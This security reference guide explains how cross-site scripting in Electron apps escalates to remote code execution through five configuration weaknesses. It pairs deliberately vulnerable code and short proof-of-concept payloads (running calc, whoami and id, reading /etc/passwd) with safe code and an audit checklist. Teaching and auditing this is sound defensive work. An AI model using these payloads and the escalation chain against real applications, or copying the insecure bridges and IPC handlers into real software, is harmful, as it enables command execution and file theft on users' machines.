# Electron XSS to RCE Escalation

## What It Is

Electron applications run web content with access to Node.js APIs. A cross-site scripting
(XSS) vulnerability that would be medium severity in a browser becomes critical (RCE) in
Electron because the attacker's JavaScript can access the filesystem, spawn processes, and
execute arbitrary commands. There are five distinct escalation paths depending on the app's
security configuration.

## The Five Escalation Paths

### Path 1: nodeIntegration Enabled

When `nodeIntegration: true` is set in `BrowserWindow` options, any JavaScript in the
renderer process has direct access to Node.js APIs.

```javascript
// Main process — INSECURE configuration
new BrowserWindow({
    webPreferences: {
        nodeIntegration: true,
        contextIsolation: false
    }
});

// XSS payload — instant RCE
require('child_process').exec('calc.exe');
```

### Path 2: contextIsolation Bypass

When `contextIsolation: false` but `nodeIntegration: false`, the renderer shares its
JavaScript context with preload scripts. Attacker can override prototypes to intercept
preload behavior.

```javascript
// Preload exposes APIs on window
window.api = { readFile: (p) => require('fs').readFileSync(p, 'utf8') };

// XSS payload: prototype pollution to hijack
Object.defineProperty(window, 'api', {
    get: function() { return { readFile: require('child_process').execSync }; }
});
```

### Path 3: Preload Bridge Abuse

Even with `contextIsolation: true`, an overly permissive preload bridge exposes
dangerous operations.

```javascript
// Preload — OVERLY PERMISSIVE bridge
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('api', {
    // Dangerous: exposes arbitrary IPC invoke
    invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),
    // Dangerous: exposes file operations
    readFile: (path) => require('fs').readFileSync(path, 'utf8'),
    // Dangerous: exposes shell execution
    runCommand: (cmd) => require('child_process').execSync(cmd).toString()
});

// XSS payload
window.api.runCommand('whoami');
window.api.readFile('/etc/passwd');
```

### Path 4: IPC Handler Abuse

The main process registers IPC handlers that perform dangerous operations. XSS in
renderer calls these handlers via exposed `ipcRenderer.invoke`.

```javascript
// Main process — dangerous IPC handlers
ipcMain.handle('shell-command', (event, cmd) => {
    return execSync(cmd).toString();  // no validation
});
ipcMain.handle('read-file', (event, path) => {
    return fs.readFileSync(path, 'utf8');  // no path restriction
});

// Preload exposes invoke generically
contextBridge.exposeInMainWorld('api', {
    invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args)
});

// XSS payload
await window.api.invoke('shell-command', 'id');
```

### Path 5: Protocol Handler / shell.openExternal

Custom protocol handlers or `shell.openExternal` with user-controlled URLs.

```javascript
// Main process registers protocol
protocol.registerFileProtocol('app', (request, callback) => {
    const filePath = request.url.replace('app://', '');
    callback({ path: filePath });  // VULN: path traversal
});

// Or: shell.openExternal with user URL
ipcMain.on('open-url', (event, url) => {
    shell.openExternal(url);  // VULN: file:// or custom protocol
});

// XSS payload
window.api.invoke('open-url', 'file:///etc/passwd');
// On macOS: open-url with calculator
window.api.invoke('open-url', 'file:///Applications/Calculator.app');
```

## Code Patterns to Look For

### In package.json / main process

```javascript
// Check BrowserWindow options
nodeIntegration: true          // PATH 1: direct RCE
contextIsolation: false        // PATH 2: prototype hijack
sandbox: false                 // weakens isolation
webSecurity: false             // disables SOP — enables loading external content
allowRunningInsecureContent    // mixed content
```

### In preload scripts

```javascript
// Look for overly broad bridges
contextBridge.exposeInMainWorld('api', {
    invoke: (...args) => ipcRenderer.invoke(...args),  // generic invoke = game over
    send: (...args) => ipcRenderer.send(...args),       // generic send
});

// Functions that directly expose Node.js modules
require('fs')          // filesystem access
require('child_process')  // command execution
require('os')          // system info
```

### In IPC handlers (main process)

```javascript
// Dangerous patterns in ipcMain.handle / ipcMain.on
exec(userInput)          // command injection via IPC
fs.readFileSync(path)    // arbitrary file read
fs.writeFileSync(path)   // arbitrary file write
shell.openExternal(url)  // protocol handler abuse
dialog.showOpenDialog()  // but then reading the file without restriction
```

### XSS Entry Points in Electron Apps

```javascript
// innerHTML with user data (most common)
element.innerHTML = userData;
document.write(userData);

// React dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userData}} />

// Markdown rendering without sanitization
marked(userInput);  // if output is placed in DOM unsanitized

// Deep links / URL parameters
const params = new URL(window.location).searchParams;
element.innerHTML = params.get('msg');  // deep link XSS

// webview tag (if allowed)
<webview src={userUrl}></webview>  // attacker-controlled content
```

## Example Vulnerable Code

### Full Chain: XSS to RCE via Preload Bridge

```javascript
// main.js
const { app, BrowserWindow, ipcMain } = require('electron');
const { execSync } = require('child_process');
const fs = require('fs');

ipcMain.handle('run-tool', (event, tool, args) => {
    // VULN: no validation of tool or args
    return execSync(`${tool} ${args}`).toString();
});

ipcMain.handle('save-config', (event, path, data) => {
    fs.writeFileSync(path, data);  // VULN: arbitrary write
});

// preload.js
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('backend', {
    runTool: (tool, args) => ipcRenderer.invoke('run-tool', tool, args),
    saveConfig: (path, data) => ipcRenderer.invoke('save-config', path, data)
});

// renderer — vulnerable to XSS
document.getElementById('output').innerHTML = serverResponse.message;

// XSS PAYLOAD (injected via serverResponse.message):
// <img src=x onerror="window.backend.runTool('id','')">
```

## Example Safe Code

```javascript
// main.js — restricted IPC
const ALLOWED_TOOLS = { 'lint': '/usr/bin/lint', 'format': '/usr/bin/prettier' };

ipcMain.handle('run-tool', (event, toolName, filePath) => {
    const tool = ALLOWED_TOOLS[toolName];
    if (!tool) throw new Error('Unknown tool');

    // Validate file path is within project
    const resolved = path.resolve(projectDir, filePath);
    if (!resolved.startsWith(projectDir + path.sep)) throw new Error('Invalid path');

    return execFileSync(tool, [resolved]).toString();  // execFile, not exec
});

// preload.js — minimal, specific bridge
contextBridge.exposeInMainWorld('backend', {
    lintFile: (filePath) => ipcRenderer.invoke('run-tool', 'lint', filePath),
    formatFile: (filePath) => ipcRenderer.invoke('run-tool', 'format', filePath)
    // NO generic invoke exposed
});

// renderer — safe DOM manipulation
document.getElementById('output').textContent = serverResponse.message;  // textContent, not innerHTML

// BrowserWindow — secure defaults
new BrowserWindow({
    webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,
        preload: path.join(__dirname, 'preload.js')
    }
});
```

## Common Bypasses

| Technique | Description |
|-----------|-------------|
| Deep link XSS | `app://host/?param=<img src=x onerror=...>` — URL params rendered unsafely |
| Markdown injection | User-supplied markdown rendered to HTML without sanitization |
| SVG injection | SVG files with embedded `<script>` or event handlers |
| PDF.js XSS | PDF renderer in Electron with XSS in annotation handling |
| postMessage | `window.postMessage` from attacker-controlled iframe to renderer |
| webview tag | If `<webview>` is allowed, attacker loads arbitrary page with node access |
| Navigation hijack | Renderer navigates to `javascript:` or `data:` URL |
| Drag-and-drop | Dropping a crafted HTML file into the app triggers XSS |
| Custom protocol handler | `app://` protocol serves attacker-controlled content |
| Electron < 12 defaults | Older Electron had `nodeIntegration: true` as default |

**Escalation chain summary:**
1. Find XSS (innerHTML, document.write, dangerouslySetInnerHTML, markdown).
2. Determine Electron security config (check `webPreferences`).
3. If `nodeIntegration: true` -- direct `require('child_process').exec()`.
4. If `contextIsolation: false` -- prototype pollution to hijack preload.
5. If `contextIsolation: true` -- enumerate exposed bridge APIs for dangerous operations.
6. If bridge is restrictive -- enumerate IPC handlers in main process for dangerous ops.
7. If IPC is restrictive -- check for `shell.openExternal` or custom protocol handlers.

## Assessment Checklist

1. [ ] Is `nodeIntegration` set to `true` in any `BrowserWindow`?
2. [ ] Is `contextIsolation` set to `false`?
3. [ ] Does the preload script expose a generic `ipcRenderer.invoke` or `ipcRenderer.send`?
4. [ ] Do IPC handlers in the main process execute commands, read/write files, or call `shell.openExternal` without strict validation?
5. [ ] Is there any use of `innerHTML`, `document.write`, or `dangerouslySetInnerHTML` with user-controlled data?
6. [ ] Does the app use `<webview>` tags or load remote content in a privileged context?
7. [ ] Are custom protocol handlers (`protocol.registerFileProtocol`) sanitizing paths?
